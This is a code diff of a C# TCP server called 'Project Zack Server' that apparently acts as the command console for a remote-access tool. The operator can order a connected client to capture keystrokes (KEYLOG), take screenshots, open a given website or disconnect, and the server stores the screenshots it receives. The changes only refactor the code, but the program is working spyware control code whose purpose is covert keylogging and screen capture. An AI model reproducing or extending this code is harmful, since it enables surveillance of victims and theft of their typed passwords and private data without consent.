@@ -16,21 +16,22 @@ namespace Server
         static void Main(string[] args)
         {
             Console.Title = "Project Zack Server";
-            StartServer();
-        }        
+            new Program().StartServer();
+        }
+
         static NetworkStream stream;
-        static void StartServer()
+
+        void StartServer()
         {
             TcpListener server = null;
             try
             {
                 Int32 port = 40;
                 server = new TcpListener(IPAddress.Any, port);
-
                 server.Start();
 
 
-                byte[] datalength = new byte[4];
+           
                 String decodedData = null;
 
                 Console.Write("Waiting for a connection... ");
@@ -38,17 +39,16 @@ namespace Server
                 Console.WriteLine("Connected!");
                 stream = client.GetStream();
 
-                Thread input = new Thread(Input);
+                Thread input = new Thread(ConsoleInput);
                 input.Start();
 
-
+                byte[] datalength = new byte[4];
                 int i;
                 while ((i = stream.Read(datalength, 0, 4)) != 0)
                 {
 
                     int dataLength = BitConverter.ToInt32(datalength, 0);
                     byte[] data = new byte[dataLength];
-                 
 
                     int bytesReceived = 0;
                     while (bytesReceived < data.Length)
@@ -78,7 +78,7 @@ namespace Server
                             imageFile.Flush();
                         }
                         Console.WriteLine("Received: {0}", "screenshot");
-                    }                 
+                    }
                     else if (decodedData.ToUpper().StartsWith("DISCONNECT"))
                     {
                         Console.WriteLine("Received: {0}", decodedData);
@@ -96,13 +96,13 @@ namespace Server
                 server.Stop();
             }
         }
-        static void Input()
+        void ConsoleInput()
         {
             while (true)
             {
                 string input = Console.ReadLine().ToUpper();
                 string[] Command = input.Split(' ');
-                
+
                 if (Command[0] == "HELP")
                 {
                     Console.WriteLine("==HELP==");
@@ -114,25 +114,25 @@ namespace Server
                 else if (Command[0] == "KEYLOG")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("SENDKCAPTURE");
-                    stream.Write(msg, 0, msg.Length);
+                    SendData(stream, msg);                  
                     Console.WriteLine("Sent: {0}", "SENDKCAPTURE");
                 }
                 else if (Command[0] == "SCREENSHOT")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("SCREENSHOT");
-                    stream.Write(msg, 0, msg.Length);
+                    SendData(stream, msg);
                     Console.WriteLine("Sent: {0}", "SCREENSHOT");
                 }
                 else if (Command[0] == "DISCONNECT")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("DISCONNECT");
-                    stream.Write(msg, 0, msg.Length);
+                    SendData(stream, msg);
                     Console.WriteLine("Sent: {0}", "DISCONNECT");
                 }
                 else if (Command[0] == "OPENSITE")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("OPENSITE|" + Command[1]);
-                    stream.Write(msg, 0, msg.Length);
+                    SendData(stream, msg);
                     Console.WriteLine("Sent: {0}", "DISCONNECT");
                 }
                 else
